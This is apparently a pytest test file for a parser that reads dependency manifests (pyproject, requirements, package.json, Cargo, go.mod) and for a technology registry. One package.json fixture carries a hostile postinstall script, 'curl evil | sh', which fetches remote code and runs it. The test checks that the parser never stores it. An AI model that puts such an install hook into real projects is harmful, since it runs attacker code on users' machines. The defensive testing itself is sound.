import json

import pytest

from vyasa.application.scanning.frameworks import default_registry, load_registry, technologies_of
from vyasa.domain.frameworks import (
    MAX_DEPENDENCIES,
    Dependency,
    ManifestParseError,
    ManifestResult,
    RegistryError,
)
from vyasa.domain.manifests import ecosystem_of, parse_manifest


def deps(name, text):
    return sorted((d.name, d.constraint, d.scope) for d in parse_manifest(name, text).dependencies)


# --- which files ---

@pytest.mark.parametrize("name,expected", [
    ("pyproject.toml", "python"), ("PyProject.TOML", "python"), ("requirements.txt", "python"),
    ("requirements-dev.txt", "python"), ("Requirements_Test.TXT", "python"), ("package.json", "javascript"),
    ("Cargo.toml", "rust"), ("go.mod", "go"), ("setup.py", None), ("package-lock.json", None),
    ("requirements.md", None), ("Dockerfile", None),
])
def test_ecosystem_of(name, expected):
    assert ecosystem_of(name) == expected


# --- python: pyproject ---

PYPROJECT = """
[build-system]
requires = ["setuptools>=61", "wheel"]

[project]
name = "x"
dependencies = [
  "fastapi>=0.100,<1",
  "Flask_SQLAlchemy",
  "zope.interface[test]>=5 ; python_version >= '3.9'",
  "mylib @ https://token@example.com/mylib.zip",
]

[project.optional-dependencies]
postgres = ["psycopg[binary]>=3"]

[dependency-groups]
dev = ["pytest>=8", {include-group = "lint"}]
lint = ["ruff"]
"""


def test_pyproject_scopes_constraints_and_names():
    assert deps("pyproject.toml", PYPROJECT) == sorted([
        ("setuptools", ">=61", "build"), ("wheel", None, "build"),
        ("fastapi", ">=0.100,<1", "runtime"), ("flask-sqlalchemy", None, "runtime"),
        ("zope-interface", ">=5", "runtime"), ("mylib", "direct reference", "runtime"),
        ("psycopg", ">=3", "optional"), ("pytest", ">=8", "dev"), ("ruff", None, "dev"),
    ])


def test_pyproject_skips_what_it_cannot_record_and_never_stores_urls():
    parsed = parse_manifest("pyproject.toml", PYPROJECT)
    assert parsed.skipped == 1  # the include-group entry
    assert "token" not in repr(parsed)


POETRY = """
[tool.poetry.dependencies]
python = "^3.11"
requests = "^2.28"
django = {version = "^4.2", extras = ["argon2"]}
local = {path = "../local"}

[tool.poetry.group.dev.dependencies]
pytest = "^8"

[tool.poetry.dev-dependencies]
black = "*"
"""


def test_poetry_tables_and_python_is_not_a_dependency():
    assert deps("pyproject.toml", POETRY) == sorted([
        ("requests", "^2.28", "runtime"), ("django", "^4.2", "runtime"), ("local", None, "runtime"),
        ("pytest", "^8", "dev"), ("black", "*", "dev"),
    ])


def test_empty_pyproject_has_no_dependencies():
    parsed = parse_manifest("pyproject.toml", "[project]\nname = 'x'\n")
    assert parsed.dependencies == () and parsed.skipped == 0 and not parsed.workspace


# --- python: requirements ---

REQ = """\
# a comment
requests>=2.28,<3   # inline
Flask==2.3.0
-r other.txt
-e .
--index-url https://user:pw@example.com/simple
https://example.com/pkg.zip
git+https://github.com/x/y.git#egg=y
numpy ; python_version < '3.9'

"""


def test_requirements_lines_and_skips():
    parsed = parse_manifest("requirements.txt", REQ)
    assert sorted((d.name, d.constraint, d.scope) for d in parsed.dependencies) == [
        ("flask", "==2.3.0", "runtime"), ("numpy", None, "runtime"), ("requests", ">=2.28,<3", "runtime")]
    assert parsed.skipped == 5


@pytest.mark.parametrize("name,scope", [
    ("requirements.txt", "runtime"), ("requirements-dev.txt", "dev"), ("requirements_test.txt", "dev"),
    ("Requirements-Docs.txt", "runtime"),
])
def test_requirements_scope_comes_from_the_file_name(name, scope):
    assert {d.scope for d in parse_manifest(name, "pytest\n").dependencies} == {scope}


# --- javascript ---

PACKAGE = json.dumps({
    "name": "x", "workspaces": ["packages/*"],
    "dependencies": {"react": "^18", "left-pad": "1.0.0"},
    "devDependencies": {"jest": "^29"},
    "optionalDependencies": {"fsevents": "*"},
    "peerDependencies": {"react-dom": ">=18"},
    "scripts": {"postinstall": "curl evil | sh"},
})


def test_package_json_scopes_and_workspace_flag():
    parsed = parse_manifest("package.json", PACKAGE)
    assert sorted((d.name, d.constraint, d.scope) for d in parsed.dependencies) == sorted([
        ("react", "^18", "runtime"), ("left-pad", "1.0.0", "runtime"), ("jest", "^29", "dev"),
        ("fsevents", "*", "optional"), ("react-dom", ">=18", "optional")])
    assert parsed.workspace is True
    assert "curl" not in repr(parsed)


def test_package_json_without_workspaces():
    assert parse_manifest("package.json", '{"dependencies": {}}').workspace is False


# --- rust ---

CARGO = """
[package]
name = "x"

[dependencies]
tokio = { version = "1", features = ["full"] }
serde = "1.0"
mine = { path = "../mine" }
renamed = { package = "real-name", version = "2" }

[dev-dependencies]
criterion = "0.5"

[build-dependencies]
cc = "1"

[target.'cfg(windows)'.dependencies]
winapi = "0.3"

[workspace]
members = ["a"]
"""


def test_cargo_scopes_platform_tables_and_workspace():
    parsed = parse_manifest("Cargo.toml", CARGO)
    assert sorted((d.name, d.constraint, d.scope) for d in parsed.dependencies) == sorted([
        ("tokio", "1", "runtime"), ("serde", "1.0", "runtime"), ("mine", None, "runtime"),
        ("real-name", "2", "runtime"), ("criterion", "0.5", "dev"), ("cc", "1", "build")])
    assert parsed.skipped == 1 and parsed.workspace is True


# --- go ---

GOMOD = """\
module example.com/x

go 1.22

require github.com/gin-gonic/gin v1.9.1

require (
\tgithub.com/stretchr/testify v1.8.4
\tgolang.org/x/sys v0.15.0 // indirect
\t// a comment
)

replace example.com/old => ../old
"""


def test_go_direct_and_indirect():
    parsed = parse_manifest("go.mod", GOMOD)
    assert sorted((d.name, d.constraint, d.scope) for d in parsed.dependencies) == [
        ("github.com/gin-gonic/gin", "v1.9.1", "runtime"), ("github.com/stretchr/testify", "v1.8.4", "runtime")]
    assert parsed.skipped == 1


# --- hostile text ---

@pytest.mark.parametrize("name,text,reason", [
    ("pyproject.toml", "[project\nname =", "syntax"),
    ("Cargo.toml", "= = =", "syntax"),
    ("package.json", "{not json", "syntax"),
    ("package.json", "[1, 2]", "structure"),
    ("package.json", '{"dependencies": [1]}', "structure"),
    ("package.json", '{"dependencies": {"a": 1}, "devDependencies": "x"}', "structure"),
    ("pyproject.toml", "project = 3", "structure"),
    ("Cargo.toml", "dependencies = 3", "structure"),
])
def test_malformed_text_raises_a_fixed_reason(name, text, reason):
    with pytest.raises(ManifestParseError) as error:
        parse_manifest(name, text)
    assert error.value.reason == reason
    assert text not in str(error.value)


def test_deeply_nested_json_is_too_deep():
    with pytest.raises(ManifestParseError) as error:
        parse_manifest("package.json", "[" * 5000 + "]" * 5000)
    assert error.value.reason == "too_deep"


def test_deeply_nested_toml_does_not_crash():
    text = "a = " + "[" * 5000 + "]" * 5000
    with pytest.raises(ManifestParseError) as error:
        parse_manifest("pyproject.toml", text)
    assert error.value.reason in {"too_deep", "syntax"}


def test_very_long_lines_are_bounded():
    parsed = parse_manifest("requirements.txt", "a" * 100_000 + "\nrequests\n")
    assert [d.name for d in parsed.dependencies if d.name == "requests"] == ["requests"]


# --- registry ---

def write(tmp_path, data):
    path = tmp_path / "technologies.json"
    path.write_text(json.dumps(data), encoding="utf-8")
    return path


def entry(key="fastapi", ecosystem="python", dependencies=("fastapi",)):
    return {"key": key, "name": key.title(), "category": "web-framework", "ecosystem": ecosystem, "dependencies": list(dependencies)}


def test_valid_registry(tmp_path):
    registry = load_registry(write(tmp_path, {"version": 3, "technologies": [entry()], "ubiquitous": ["fastapi"]}))
    assert registry.version == 3 and registry.keys() == ("fastapi",) and registry.ubiquitous == {"fastapi"}
    assert registry.key_for("python", "fastapi") == "fastapi" and registry.key_for("rust", "fastapi") is None


def test_shipped_registry_is_valid_and_sized():
    registry = default_registry()
    assert registry.version >= 1 and 30 <= len(registry.keys()) <= 60
    assert registry.key_for("python", "fastapi") == "fastapi" and registry.key_for("javascript", "react") == "react"
    assert registry.key_for("rust", "tokio") == "tokio" and registry.key_for("go", "github.com/gin-gonic/gin") == "gin"
    assert registry.ubiquitous <= set(registry.keys())


@pytest.mark.parametrize("mutate,match", [
    (lambda d: d.pop("version"), "version"),
    (lambda d: d.update(version="1"), "version"),
    (lambda d: d["technologies"].append(entry()), "duplicate"),
    (lambda d: d["technologies"].append(entry("other", dependencies=("fastapi",))), "fastapi"),
    (lambda d: d["technologies"][0].update(ecosystem="cobol"), "ecosystem"),
    (lambda d: d["technologies"][0].pop("name"), "name"),
    (lambda d: d["technologies"][0].update(dependencies=[]), "dependencies"),
    (lambda d: d["technologies"][0].update(key="Has Space"), "key"),
    (lambda d: d.update(ubiquitous=["nope"]), "ubiquitous"),
    (lambda d: d.update(technologies="x"), "technologies"),
])
def test_malformed_registry_is_rejected_naming_the_field(tmp_path, mutate, match):
    data = {"version": 1, "technologies": [entry()], "ubiquitous": []}
    mutate(data)
    with pytest.raises(RegistryError, match=match):
        load_registry(write(tmp_path, data))


def test_unreadable_registry_is_rejected(tmp_path):
    with pytest.raises(RegistryError):
        load_registry(tmp_path / "missing.json")


# --- technologies from manifests ---

REGISTRY = default_registry()


def result(path, ecosystem, *dependencies, status="parsed"):
    return ManifestResult(path, ecosystem, status, None, tuple(dependencies), len(dependencies), 0, False)


def test_known_dependencies_become_technologies_with_scopes():
    found = technologies_of((result("pyproject.toml", "python", Dependency("fastapi", None, "runtime"), Dependency("pytest", None, "dev")),), REGISTRY)
    assert [(t.key, t.scopes, t.manifests) for t in found] == [
        ("fastapi", ("runtime",), ("pyproject.toml",)), ("pytest", ("dev",), ("pyproject.toml",))]


def test_scopes_and_manifests_are_united():
    found = technologies_of((
        result("package.json", "javascript", Dependency("jest", None, "runtime"), Dependency("jest", None, "dev")),
        result("requirements.txt", "python", Dependency("pytest", None, "dev")),
        result("requirements-dev.txt", "python", Dependency("pytest", None, "dev")),
    ), REGISTRY)
    by_key = {t.key: t for t in found}
    assert by_key["jest"].scopes == ("dev", "runtime")
    assert by_key["pytest"].manifests == ("requirements-dev.txt", "requirements.txt")


def test_unknown_dependency_creates_nothing():
    assert technologies_of((result("package.json", "javascript", Dependency("left-pad", "1", "runtime")),), REGISTRY) == ()


def test_ecosystems_do_not_mix():
    # a rust crate named like a python registry entry must not match it
    assert technologies_of((result("Cargo.toml", "rust", Dependency("fastapi", None, "runtime")),), REGISTRY) == ()


def test_only_parsed_manifests_contribute():
    bad = ManifestResult("package.json", "javascript", "malformed", "syntax", (), 0, 0, False)
    assert technologies_of((bad,), REGISTRY) == ()


def test_cap_constant():
    assert MAX_DEPENDENCIES == 200
